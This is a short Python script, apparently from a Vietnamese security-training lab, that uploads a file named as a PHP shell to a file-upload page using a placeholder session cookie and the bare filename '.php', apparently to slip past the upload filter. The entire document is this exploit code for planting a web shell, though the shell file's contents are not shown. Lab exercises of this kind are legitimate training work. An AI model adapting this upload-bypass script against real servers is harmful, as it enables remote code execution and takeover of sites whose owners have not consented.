#!/usr/bin/python3

import requests

r = requests.session()
cookies = {"PHPSESSID": "insert_your_session_here"}

URL = "http://drive.kid.cyberjutsu-lab.tech/index.php"


def sendFile(pathToFile, fileName):
    content = open(pathToFile, "rb")
    files = {"file": (fileName, content)}
    result = r.post(url=URL, files=files, cookies=cookies)
    print(result.text)  # Mã nguồn HTML trả về


sendFile("o-cung-cuoi-cung-shell.php", ".php")
